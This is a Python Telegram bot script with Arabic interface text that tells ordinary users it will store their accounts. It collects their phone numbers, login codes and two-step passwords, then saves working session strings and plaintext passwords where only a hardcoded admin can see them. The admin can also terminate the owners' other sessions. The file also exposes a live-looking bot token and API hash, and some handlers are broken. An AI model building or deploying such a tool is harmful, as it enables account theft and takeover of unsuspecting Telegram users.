import os
from telethon.tl import functions
from telethon.sessions import StringSession
import asyncio, json, shutil
from kvsqlite.sync import Client as uu
from telethon import TelegramClient, events, Button
from telethon.tl.types import DocumentAttributeFilename
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

if not os.path.isdir('database'):
    os.mkdir('database')

API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
admin = 7072622935
token = "7315494223:AAFs_jejjsSrP7J8bDSprHM7KhAJ2nz3tSc"
client = TelegramClient('BotSession', API_ID, API_HASH).start(bot_token=token)
bot = client

# Create DataBase
db = uu('database/elhakem.ss', 'bot')

if not db.exists("accounts"):
    db.set("accounts", [])

def update_main_buttons():
    accounts = db.get("accounts")
    accounts_count = len(accounts)
    main_buttons = [
        [Button.inline("➕ إضافة حساب", data="add")],
        [Button.inline(f"📲 حساباتك ({accounts_count})", data="your_accounts")],
        [Button.inline("💾 نسخة احتياطية", data="backup")],
        [Button.inline("📂 رفع نسخة احتياطية", data="restore")]
    ]
    return main_buttons

@client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
async def start(event):
    user_id = event.chat_id
    if user_id != admin:
        await event.reply("👋 أهلاً بك عزيزي! هذا البوت مخصص لتخزين حسابات تيليجرام ويمكنك استرجاعها في أي وقت.", buttons=[[Button.inline("➕ إضافة حساب", data="add")]])
        return

    await event.reply("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=update_main_buttons())

@client.on(events.callbackquery.CallbackQuery())
async def callback_handler(event):
    data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
    user_id = event.chat_id
    accounts = db.get("accounts")

    if data == "back":
        await event.edit("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=update_main_buttons())

    elif data == "add":
        async with bot.conversation(user_id) as x:
            await x.send_message("✔️الان ارسل رقمك مع رمز دولتك , مثال :+201000000000")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")

            if any(account['phone_number'] == phone_number for account in accounts):
                await x.send_message("- هذا الحساب تم إضافته مسبقًا.")
                return

            app = TelegramClient(StringSession(), API_ID, API_HASH)
            await app.connect()
            password = None
            try:
                await app.send_code_request(phone_number)
            except (ApiIdInvalidError, PhoneNumberInvalidError):
                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                return

            await x.send_message("- تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
            txt = await x.get_response()
            code = txt.text.replace(" ", "")
            try:
                await app.sign_in(phone_number, code, password=None)
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": "لا يوجد", "session": string_session}
                accounts.append(data)
                db.set("accounts", accounts)
                await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                return
            except SessionPasswordNeededError:
                await x.send_message("- أرسل رمز التحقق بخطوتين الخاص بحسابك")
                txt = await x.get_response()
                password = txt.text
                try:
                    await app.sign_in(password=password)
                except PasswordHashInvalidError:
                    await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    return
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": password, "session": string_session}
                accounts.append(data)
                db.set("accounts", accounts)
                await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    elif data == "your_accounts":
        if len(accounts) == 0:
            await event.edit("- لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            return

        account_buttons = [[Button.inline(f"📱 {i['phone_number']}", data=f"get_{i['phone_number']}")] for i in accounts]
        account_buttons.append([Button.inline("🔙 رجوع", data="back")])
        await event.edit("- اختر الحساب لإدارة الخيارات:", buttons=account_buttons)

    elif data.startswith("get_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                try:
                    await app.connect()
                    me = await app.get_me()
                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    device_count = len(sessions.authorizations)

                    text = f"• رقم الهاتف : {phone_number}\n" \
                           f"- الاسم : {me.first_name} {me.last_name or ''}\n" \
                           f"- عدد الاجهزة المتصلة : {device_count}\n" \
                           f"- التحقق بخطوتين : {i['two-step']}"

                    account_action_buttons = [
                        [Button.inline("📱 عرض الجلسات", data=f"show_sessions_{phone_number}")],
                        [Button.inline("🔙 رجوع", data="your_accounts")]
                    ]
                    await event.edit(text, buttons=account_action_buttons)
                except Exception as e:
                    accounts.remove(i)
                    db.set("accounts", accounts)
                    await event.edit("⚠️ لم يعد الوصول إلى هذا الحساب ممكناً وتم حذفه من القائمة.")
                finally:
                    await app.disconnect()
                break

    elif data.startswith("show_sessions_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()
                
                sessions = await app(functions.account.GetAuthorizationsRequest())
                session_buttons = [
                    [Button.inline(f"{s.device_model} - {s.platform}", data=f"remove_session_{s.hash}")]
                    for s in sessions.authorizations if not s.current
                ]
                session_buttons.append([Button.inline("🔴 إنهاء جميع الجلسات", data=f"terminate_all_sessions_{phone_number}")])
                session_buttons.append([Button.inline("🔙 رجوع", data=f"get_{phone_number}")])
                
                await event.edit("📱 الجلسات المتصلة:\nاختر الجلسة التي تود انهاءها أو انهاء جميع الجلسات:", buttons=session_buttons)
                await app.disconnect()
                break

    elif data.startswith("remove_session_"):
        session_hash = int(data.split("_")[2])
        for i in accounts:
            app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
            await app.connect()
            await app(functions.account.ResetAuthorizationRequest(session_hash))
            await app.disconnect()
            await event.edit("✅ تم إزالة الجلسة المحددة.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])

    elif data == "backup":
        backup_data = {"accounts": accounts}
        with open("database/backup.json", "w") as backup_file:
            json.dump(backup_data, backup_file)
        await bot.send_file(user_id, "database/backup.json", caption="✅ تم إنشاء نسخة احتياطية بنجاح.")

    elif data == "restore":
        async with bot.conversation(user_id) as x:
            await x.send_message("📂 أرسل ملف النسخة الاحتياطية (backup.json)")
            response = await x.get_response()
            if response.file and response.file.name == "backup.json":
                await bot.download_media(response, "database/backup.json")
                with open("database/backup.json", "r") as backup_file:
                    backup_data = json.load(backup_file)
                db.set("accounts", backup_data["accounts"])
                await x.send_message("✅ تم استعادة النسخة الاحتياطية بنجاح", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    elif data.startswith("terminate_sessions_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()

                try:
                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    device_buttons = [
                        [Button.inline(f"{session.device_model} - {session.app_name}", data=f"remove_session_{session.hash}")]
                        for session in sessions.authorizations if not session.current
                    ]
                    device_buttons.append([Button.inline("🔴 إنهاء جميع الجلسات", data="terminate_all_sessions")])
                    device_buttons.append([Button.inline("🔙 رجوع", data="your_accounts")])

                    await event.edit(f"اختر الجلسة التي تود إنهاءها للحساب: {phone_number}", buttons=device_buttons)
                
                except Exception as e:
                    await event.edit("⚠️ حدث خطأ أثناء عرض الجلسات.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
                finally:
                    await app.disconnect()

    elif data.startswith("remove_session_"):
        session_hash = int(data.split("_")[2])
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()

                try:
                    await app(functions.account.ResetAuthorizationRequest(session_hash))
                    await event.edit("✅ تم إنهاء الجلسة بنجاح.", buttons=[[Button.inline("🔙 رجوع", data=f"terminate_sessions_{phone_number}")]])

                except Exception as e:
                    await event.edit("⚠️ حدث خطأ أثناء إنهاء الجلسة.", buttons=[[Button.inline("🔙 رجوع", data=f"terminate_sessions_{phone_number}")]])
                finally:
                    await app.disconnect()

    elif data == "terminate_all_sessions":
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()

                try:
                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    for session in sessions.authorizations:
                        if not session.current:
                            await app(functions.account.ResetAuthorizationRequest(session.hash))
                    
                    await event.edit(f"✅ تم إنهاء جميع الجلسات بنجاح للحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
                
                except Exception as e:
                    await event.edit("⚠️ حدث خطأ أثناء إنهاء جميع الجلسات.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
                finally:
                    await app.disconnect()

client.run_until_disconnected()
